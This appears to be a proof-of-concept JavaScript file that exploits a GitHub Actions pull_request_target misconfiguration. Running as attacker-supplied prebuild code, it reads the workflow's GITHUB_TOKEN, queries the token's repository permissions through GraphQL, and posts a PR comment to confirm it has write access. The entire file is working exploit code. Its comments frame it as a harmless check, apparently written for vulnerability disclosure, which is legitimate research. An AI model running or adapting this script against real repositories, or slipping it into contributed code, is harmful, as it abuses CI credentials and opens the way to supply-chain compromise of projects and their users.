// scripts/poc.js
const fs = require('fs');
const https = require('https');

const repo = process.env.GITHUB_REPOSITORY || '';           // "owner/repo"
const token = process.env.GITHUB_TOKEN || '';
const eventPath = process.env.GITHUB_EVENT_PATH || '';
const apiBase = process.env.GITHUB_API_URL || 'https://api.github.com';

console.log('PoC: attacker-controlled code executed in pull_request_target (prebuild)');

let prNumber;
try {
  const payload = JSON.parse(fs.readFileSync(eventPath, 'utf8'));
  prNumber = payload?.pull_request?.number;
} catch (e) {
  console.log('Could not read PR number from event payload:', e.message);
}

if (!repo || !prNumber) {
  console.log('Missing repo or PR number; skipping write test.');
  process.exit(0);
}

// 1) Probe permission via GraphQL (viewer + viewerPermission) – read-only and safe.
const gqlBody = JSON.stringify({
  query: `query($owner:String!, $name:String!){
    viewer { login }
    repository(owner:$owner, name:$name){ viewerPermission }
  }`,
  variables: { owner: repo.split('/')[0], name: repo.split('/')[1] }
});

const gqlReq = https.request(`${apiBase}/graphql`, {
  method: 'POST',
  headers: {
    'Authorization': `Bearer ${token}`,
    'User-Agent': 'poc-script',
    'Content-Type': 'application/json'
  }
}, res => {
  let data = '';
  res.on('data', d => data += d);
  res.on('end', () => {
    console.log('GraphQL probe status:', res.statusCode);
    console.log('GraphQL probe body:', data.substring(0, 500));
    // 2) Try a harmless write: post a PR comment
    postComment();
  });
});
gqlReq.on('error', e => {
  console.log('GraphQL probe failed:', e.message);
  postComment();
});
gqlReq.write(gqlBody);
gqlReq.end();

function postComment() {
  const body = JSON.stringify({ body: '🔐 PoC: GITHUB_TOKEN write test from `pull_request_target` (expected on vulnerable setup). If you see this, token had write perms.' });
  const req = https.request(`${apiBase}/repos/${repo}/issues/${prNumber}/comments`, {
    method: 'POST',
    headers: {
      'Authorization': `Bearer ${token}`,
      'User-Agent': 'poc-script',
      'Content-Type': 'application/json',
      'Accept': 'application/vnd.github+json'
    }
  }, res => {
    let data = '';
    res.on('data', d => data += d);
    res.on('end', () => {
      console.log('Comment POST status:', res.statusCode);
      if (res.statusCode === 201) {
        console.log('✅ Write confirmed: PR comment created.');
      } else if (res.statusCode === 403) {
        console.log('🟡 Likely read-only token (403). No write perms.');
      } else {
        console.log('ℹ️ Unexpected response posting comment:', data.substring(0, 500));
      }
    });
  });
  req.on('error', e => console.log('Comment POST failed:', e.message));
  req.write(body);
  req.end();
}
